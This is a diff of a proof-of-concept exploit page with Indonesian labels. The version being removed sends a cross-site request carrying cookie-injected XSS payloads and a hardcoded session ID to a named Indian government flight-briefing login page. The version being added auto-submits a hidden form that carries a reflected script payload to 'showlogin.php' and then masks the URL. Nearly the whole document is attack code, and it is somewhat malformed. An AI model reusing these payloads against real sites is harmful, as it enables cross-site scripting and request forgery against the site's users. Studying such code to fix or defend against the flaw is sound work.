@@ -8,32 +8,15 @@
       <button id="exploitBtn">Klik untuk Eksploitasi</button>
       <div id="status"></div>
 
+<form action="https://target/showlogin.php" method="POST">
+        <input type="hidden" name="errmsg" value="<script>alert(1)</script>">
+        <input type="submit">
     <script>
-        document.getElementById('exploitBtn').addEventListener('click', function() {
-            var url = 'https://olbs.amssdelhi.gov.in/nsweb/FlightBriefing/showlogin.php';
-            var params = 'errmsg=';
-
-            fetch(url, {
-                method: 'POST',
-                mode: 'cors', // Mencoba melakukan request lintas domain
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'X-Requested-With': 'XMLHttpRequest' // Header yang DIWAJIBKAN server
-                    'Cookie': 'r_username=%22%3E%3E%3C%3Csvg%2Fonload%3Dalert(1)%3E; r_password=%22%3E%3E%3C%3Csvg%2Fonload%3Dalert(1)%3E; PHPSESSID=ku6v0b1aovcrhvu4ibf2u6vk47'
-                },
-                body: params,
-                credentials: 'include' // PENTING: Untuk mengirim cookies/session korban
-            })
-            .then(response => {
-                document.getElementById('status').innerText = 'Request Terkirim. Cek Network Tab.';
-                console.log('Response:', response);
-            })
-            .catch(error => {
-                document.getElementById('status').innerText = 'Gagal (Kemungkinan diblokir CORS). Cek Console/Network Tab.';
-                console.error('Error:', error);
-            });
-        });
-    </script>
+          history.pushState('', '', '/');
+          document.forms[0].submit();
+      </script>
+    
+</form>
   </body>
 </html>
 
